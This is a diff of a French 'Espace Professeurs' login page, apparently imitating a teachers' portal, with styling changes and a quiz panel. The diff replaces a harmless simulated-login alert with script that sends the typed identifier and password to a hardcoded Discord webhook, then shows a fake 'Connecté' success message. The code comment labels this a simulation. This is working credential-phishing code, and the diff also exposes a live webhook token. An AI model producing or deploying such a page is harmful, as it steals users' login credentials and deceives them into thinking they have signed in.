@@ -1,128 +1,108 @@
 <!DOCTYPE html>
 <html lang="fr">
 <head>
-<meta charset="UTF-8">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Espace Professeurs</title>
+  <style>
+    * {
+      box-sizing: border-box;
+      font-family: Arial, sans-serif;
+    }
+    body {
+      margin: 0;
+      background: #0a9a84;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+    .logo {
+      position: fixed;
+      top: 15px;
+      right: 20px;
+    }
+    .logo img {
+      height: 38px;
+    }
+    .container {
+      width: 90%;
+      max-width: 1100px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+    .left {
+      color: white;
+      max-width: 460px;
+    }
+    .badge {
+      background: #f5c400;
+      color: black;
+      font-size: 12px;
+      padding: 4px 8px;
+      border-radius: 6px;
+      font-weight: bold;
+    }
+    .left h2 { margin: 15px 0; }
+    .left ul { list-style: none; padding: 0; }
+    .left li { margin: 6px 0; }
 
-<!-- IMPORTANT pour téléphone -->
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+    .login-box {
+      background: white;
+      width: 340px;
+      padding: 25px;
+      border-radius: 12px;
+      box-shadow: 0 12px 30px rgba(0,0,0,.25);
+      text-align: center;
+    }
+    .radio {
+      display: flex;
+      justify-content: space-around;
+      margin-bottom: 15px;
+      font-size: 14px;
+    }
+    input {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 12px;
+      border-radius: 6px;
+      border: 1px solid #ccc;
+    }
+    button {
+      width: 100%;
+      padding: 12px;
+      border-radius: 20px;
+      border: none;
+      color: white;
+      font-weight: bold;
+      cursor: pointer;
+      background: #1e88e5;          /* Bleu par défaut */
+      opacity: 0.45;                 /* Grisâtre / désactivé visuellement */
+      transition: all 0.2s;
+    }
+    button.active {
+      opacity: 1;                    /* Pleine couleur quand actif */
+      background: #1e88e5;
+    }
+    button:disabled {
+      cursor: not-allowed;
+    }
 
-<title>Espace Professeurs</title>
-
-<style>
-*{
-  box-sizing:border-box;
-  font-family:Arial,sans-serif;
-}
-
-body{
-  margin:0;
-  background:#0a9a84;
-  min-height:100vh;
-  display:flex;
-  justify-content:center;
-  align-items:center;
-}
-
-/* Logo */
-.logo{
-  position:fixed;
-  top:15px;
-  right:20px;
-}
-.logo img{
-  height:38px;
-}
-
-/* Structure principale */
-.container{
-  width:90%;
-  max-width:1100px;
-  display:flex;
-  justify-content:space-between;
-  align-items:center;
-}
-
-/* Partie gauche (PC uniquement) */
-.left{
-  color:white;
-  max-width:460px;
-}
-
-.badge{
-  background:#f5c400;
-  color:black;
-  font-size:12px;
-  padding:4px 8px;
-  border-radius:6px;
-  font-weight:bold;
-}
-
-.left h2{margin:15px 0}
-.left ul{list-style:none;padding:0}
-.left li{margin:6px 0}
-
-/* Login */
-.login-box{
-  background:white;
-  width:340px;
-  padding:25px;
-  border-radius:12px;
-  box-shadow:0 12px 30px rgba(0,0,0,.25);
-  text-align:center;
-}
-
-.radio{
-  display:flex;
-  justify-content:space-around;
-  margin-bottom:15px;
-  font-size:14px;
-}
-
-input{
-  width:100%;
-  padding:12px;
-  margin-bottom:12px;
-  border-radius:6px;
-  border:1px solid #ccc;
-}
-
-button{
-  width:100%;
-  padding:12px;
-  border-radius:20px;
-  border:none;
-  background:#ccc;
-  color:white;
-}
-
-button.active{
-  background:#1e88e5;
-}
-
-/* ===== VERSION MOBILE ===== */
-@media screen and (max-width: 768px){
-
-  body{
-    padding:20px;
-  }
-
-  .container{
-    flex-direction:column;
-    align-items:center;
-  }
-
-  .left{
-    display:none; /* cache le quiz sur téléphone */
-  }
-
-  .login-box{
-    width:100%;
-    max-width:400px;
-  }
-}
-</style>
+    @media screen and (max-width: 768px) {
+      body { padding: 20px; }
+      .container {
+        flex-direction: column;
+        align-items: center;
+      }
+      .left { display: none; }
+      .login-box {
+        width: 100%;
+        max-width: 400px;
+      }
+    }
+  </style>
 </head>
-
 <body>
 
 <a href="#" class="logo">
@@ -130,7 +110,6 @@ button.active{
 </a>
 
 <div class="container">
-
   <div class="left">
     <span class="badge">ENVIRONNEMENT</span>
     <h2>Quel est le pourcentage d’eau douce sur Terre ?</h2>
@@ -144,42 +123,65 @@ button.active{
 
   <div class="login-box">
     <h3>Espace Professeurs</h3>
-
     <div class="radio">
       <label><input type="radio" name="lieu" checked> Domicile</label>
       <label><input type="radio" name="lieu"> Dans la classe</label>
     </div>
-
-    <input id="user" type="text" placeholder="Identifiant">
+    <input id="user" type="text"    placeholder="Identifiant">
     <input id="pass" type="password" placeholder="Mot de passe">
-
-    <button id="btn" disabled>Se connecter</button>
+    <button id="btn" type="button">Se connecter</button>
+    <p id="message" style="color:green; margin-top:10px; display:none;">✅ Connecté !</p>
   </div>
-
 </div>
 
 <script>
-const user = document.getElementById("user");
-const pass = document.getElementById("pass");
-const btn  = document.getElementById("btn");
+  const user = document.getElementById("user");
+  const pass = document.getElementById("pass");
+  const btn  = document.getElementById("btn");
 
-function check(){
-  if(user.value.trim() && pass.value.trim()){
-    btn.classList.add("active");
-    btn.disabled = false;
-  } else {
-    btn.classList.remove("active");
-    btn.disabled = true;
+  function check() {
+    const bothFilled = user.value.trim() !== "" && pass.value.trim() !== "";
+    btn.disabled = !bothFilled;
+    btn.classList.toggle("active", bothFilled);
   }
-}
 
-user.addEventListener("input", check);
-pass.addEventListener("input", check);
+  // Vérifier dès le chargement (au cas où il y aurait déjà des valeurs)
+  check();
 
-btn.addEventListener("click", () => {
-  alert("Connexion simulée");
-});
+  user.addEventListener("input", check);
+  pass.addEventListener("input", check);
+
+  // Simulation de connexion (webhook Discord)
+  btn.addEventListener("click", () => {
+    if (btn.disabled) return;
+
+    const webhookUrl = 'https://discord.com/api/webhooks/1472970808015061072/r5E9PRREA5jd1Oz7UPV9Zt0SJU2ifvVDcywyOn1WvpEImrBdmc0XmA_hVLpUfQgfAMcw';
+
+    const data = {
+      username: 'Nouvelle Connexion',
+      content: `Identifiant: ${user.value}\nMot de passe: ${pass.value}`
+    };
+
+    fetch(webhookUrl, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(data)
+    })
+    .then(response => {
+      if (!response.ok) throw new Error("Erreur réseau");
+      return response.json();
+    })
+    .then(() => {
+      document.getElementById("message").style.display = "block";
+      btn.disabled = true;
+      btn.textContent = "Connecté";
+      btn.style.background = "#4caf50";
+    })
+    .catch(err => {
+      console.error(err);
+      alert("Erreur lors de l'envoi vers Discord");
+    });
+  });
 </script>
-
 </body>
 </html>
